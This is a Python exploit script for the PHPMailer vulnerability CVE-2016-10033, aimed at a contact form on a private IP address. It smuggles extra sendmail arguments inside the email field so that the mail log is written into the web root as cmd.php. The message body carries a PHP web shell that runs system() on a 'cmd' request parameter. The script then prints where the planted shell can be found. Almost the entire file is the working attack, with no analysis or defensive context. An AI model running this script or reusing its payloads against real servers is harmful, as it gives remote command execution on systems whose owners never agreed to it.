import requests

print("""
   _______    ________   ___   ____ ________      _______  ____ __________
  / ____/ |  / / ____/  |__ \ / __ <  / ___/     <  / __ \/ __ \__  /__  /
 / /    | | / / __/     __/ // / / / / __ \______/ / / / / / / //_ < /_ < 
/ /___  | |/ / /___    / __// /_/ / / /_/ /_____/ / /_/ / /_/ /__/ /__/ / 
\____/  |___/_____/   /____/\____/_/\____/     /_/\____/\____/____/____/

[?] PHPMailer Exploit CVE 2016-10033""")

target = "http://192.168.0.108/contact.php"
path = "/var/www/html/"
filename = "cmd.php"
payload = "<?php if(isset($_REQUEST['cmd'])){ echo \"<pre>\"; $cmd = ($_REQUEST['cmd']); system($cmd); echo \"</pre>\"; die; }?>"

headers = {"User-Agent":"Mozilla/5.0",
           "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}

email_from = f'"attacker\\" -oQ/tmp/ -X{path}{filename} some"@email.com';

data = f"action=submit&name=test&email={email_from}&subject=test&message={payload}"

r = requests.post(url=target, headers=headers, data=data)
if r.status_code == 200:
    print(f"[+] Check url targetURL/ + {filename}")
else:
    print("[-] Error ((")